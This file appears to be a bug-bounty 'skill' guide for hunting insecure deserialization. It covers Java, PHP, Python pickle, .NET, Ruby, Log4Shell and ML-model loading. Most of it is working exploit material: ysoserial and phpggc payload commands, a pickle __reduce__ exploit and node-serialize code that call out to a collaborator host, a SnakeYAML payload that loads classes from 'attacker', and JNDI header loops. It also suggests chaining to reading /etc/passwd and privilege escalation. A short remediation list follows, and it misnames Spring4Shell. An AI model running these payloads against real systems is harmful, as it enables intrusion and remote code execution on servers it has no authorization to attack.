---
name: hunt-deserialization
description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell, plus modern vectors (Jackson/SnakeYAML polymorphic typing, Spring4Shell, Text4Shell, ML-model pickle). RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, Ruby on Rails, or loads ML model files.
sources: hackerone_public, cve_database, public_research
report_count: 22
cwe: [CWE-502, CWE-917, CWE-94, CWE-470]
cvss_baseline: "Critical (9.8) unauthenticated RCE — the norm. High (8.1) when authenticated or constrained to blind OOB only. Lower only if no gadget reaches a dangerous sink (prove, don't assume)."
related_skills: [hunt-rce, hunt-file-upload, hunt-ssti, hunt-llm-ai, hunt-springboot, triage-validation]
---

# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## New Techniques (2024-2026)

### JSON/YAML polymorphic-typing RCE (the modern dominant vector)
Binary-serialized blobs are rarer now; the live surface is typed JSON/YAML:
- **Jackson (FasterXML)** — `enableDefaultTyping()` / `@JsonTypeInfo` lets the attacker pick the concrete class via a `@class`/`@type` field → gadget to JNDI/`JdbcRowSetImpl` → RCE. Look for JSON APIs echoing/accepting a type discriminator.
- **SnakeYAML CVE-2022-1471** — `yaml.load()` without `SafeConstructor`: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` → remote class load → RCE.
- **FastJson / Fastjson2** (`@type` autotype) — same idea in the JVM JSON world.
- **.NET Json.NET** `TypeNameHandling != None` → `$type` gadget → RCE.

### Expression-injection RCE classes often grouped with deser
- **Spring4Shell CVE-2022-22965** — data-binding to `class.module.classLoader...` on Spring MVC/WebFlux (Tomcat) → webshell.
- **Text4Shell CVE-2022-42889** — Apache Commons Text `StringSubstitutor` `${script:...}`/`${url:...}`/`${dns:...}` interpolation → RCE/SSRF.
- Keep **Log4Shell** post-patch bypasses in mind (2.15/2.16 nested-lookup bypasses) when a partially-patched version is detected.

### .NET ViewState with leaked machineKey
If `__VIEWSTATE` MAC is enabled but the `machineKey` leaks (web.config disclosure, CVE-2020-0688 Exchange static key), sign a ysoserial.net `ViewState` gadget → RCE. Cross-ref `hunt-source-leak`, `hunt-aspnet`.

### ML-model / data-science deserialization (high-value, under-tested)
AI/ML apps load untrusted model/artifact files that deserialize arbitrary code:
- **Python pickle** inside `.pkl`, PyTorch `.pt/.bin` (`torch.load`), `joblib`, `numpy.load(allow_pickle=True)`, `pandas.read_pickle` → `__reduce__` RCE on model upload/import.
- **Keras/TF `Lambda` layers**, **`.pb`/`.h5`** custom objects.
If the target ingests user-supplied models/datasets (training UI, "import model", notebook), this is a direct RCE surface. Cross-ref `hunt-llm-ai`, `hunt-rag-vector`.

### Detection-first discipline
Prefer OOB (DNS/HTTP via interactsh) gadgets for *detection* before firing command-exec; many stacks are blind. A DNS callback with a unique subdomain is sufficient Critical PoC without running intrusive commands.

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Remediation

- Never deserialize untrusted data into code-bearing object graphs. Use data-only formats with safe parsers (`yaml.safe_load`, Jackson default typing OFF, Json.NET `TypeNameHandling.None`, JSON over native serialization).
- For pickle/Marshal/BinaryFormatter: avoid entirely for untrusted input; if unavoidable, use allowlist `ObjectInputFilter` (Java), signed+encrypted blobs, or safetensors instead of pickle for ML models.
- Patch and pin: Log4j ≥2.17.1, SnakeYAML ≥2.0, Spring/Tomcat for Spark4Shell, Commons-Text ≥1.10.
- Isolate workers that must load models/archives (no internal network, no cloud metadata, least privilege).

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

## Disclosed Report Patterns

Verify before quoting IDs/amounts.
- **Java gadget chain via serialized cookie/parameter → RCE** (CommonsCollections, Shiro default key) — canonical critical.
- **SnakeYAML/Jackson polymorphic typing → RCE** — the common modern JVM disclosure.
- **PHP phar:// deserialization via fs sink** — RCE with no `unserialize()` in code.
- **ML-model pickle RCE on import** — emerging high-value class in AI products.
